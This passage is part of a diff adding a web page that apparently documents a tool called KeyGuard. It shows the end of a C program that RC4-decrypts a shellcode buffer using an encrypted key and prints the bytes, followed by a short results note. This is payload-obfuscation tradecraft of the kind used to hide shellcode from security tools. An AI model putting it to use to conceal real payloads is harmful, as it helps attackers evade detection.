+	if (!Rc4EncryptionViSystemFunc032(pRealKey, Rc4EncryptedPayload, sizeof(ProtectedKey), sizeof(Rc4EncryptedPayload))) {
+		return -1;
+	}
+
+    // Printing payload
+	PrintHexData(&quot;DecryptedPayload&quot;, Rc4EncryptedPayload, sizeof(Rc4EncryptedPayload));
+
+	printf(&quot;[#] Press &lt;Enter&gt; To Quit ... &quot;);
+	getchar();
+
+	return 0;
+}</code></pre>
+        </div><h3 id="results" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Results</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The original shellcode bytes were retrieved using the encrypted key, demonstrating the KeyGuard tool usage and benefits.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/keyguard-316007780-4cc95a19-5f8c-48db-99e6-defa90b83820.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div></main></body></html>
